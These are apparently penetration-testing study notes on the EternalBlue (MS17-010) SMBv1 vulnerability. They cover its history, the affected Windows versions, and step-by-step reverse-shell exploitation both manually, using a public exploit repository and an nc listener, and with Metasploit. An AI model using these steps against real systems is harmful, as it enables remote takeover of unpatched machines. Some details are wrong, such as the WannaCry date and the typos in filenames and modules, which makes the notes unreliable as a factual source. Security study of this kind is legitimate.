> EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of
  Windows vulnerabilities and exploits that allow attackers to remotely execute
  arbitrary code and gain access to a Windows system and consequently the
  network that the target system is a part of.
> The EternalBlue exploit was developed by the NSA (National Security Agency)
  to take advantage of the MS17-010 vulnerability and was leaked to the public
  by a hacker group called the Shadow Brokers in 2017.
> The EternalBlue exploit takes advantage of a vulnerability in the Windows
  SMBv1 protocol that allows attackers to send specially crafted packets that
  consequently facilitate the execution of arbitrary commands.
  
> The EternalBlue exploit was used in the WannaCry ransomware attack on June
  27, 2017 to exploit other Windows systems across networks with the objective
  of spreading the ransomware to as many systems as possible.
> This vulnerability affects multiple versions of Windows:
  > Windows Vista
  > Windows 7
  > Windows Server 2008
  > Windows 8.1
  > Windows Server 2012
  > Windows 10
  > Windows Server 2016
   
> Microsoft released a patch for the vulnerability in March, 2017, however, many
  users and companies have still not yet patched their systems.
> The EternalBlue exploit has a MSF auxiliary module that can be used to check if
  a target system if vulnerable to the exploit and also has an exploit module that
  can be used to exploit the vulnerability on unpatched systems.
> The EternalBlue exploit module can be used to exploit vulnerable Windows
  systems and consequently provide us with a privileged meterpreter session on
  the target system.
> In addition to MSF modules, we can also manually exploit the vulnerability by
  utilizing publicly available exploit code.

manual exploit without msf:
> git clone https://github.com/3ndG4me/AutoBlue-MS17-010
  > pip install -r requirements.txt
    > cd shellcode && chmod +x shell_prep.sh && ./shell_prep.sh

      > LPORT for x86 and x64 <local port>
      > regular shell - 1
      > stageless payload - 1
      > output sc_x64.bin or sc_x84.bin
> nc -lvnp <local port>
> cd .. && python3 eternalblue_exploit7.py <IP> shellcode/sc_x64.bin or sc_x84.bin

automatic exploit with msf:
> msfconsole -q
  > search eternalblue
    > use exploiut/windows/smb/ms17_010_eternalblue
      > set LHOST
      > set LPORT
      > set RHOSTS
      > run
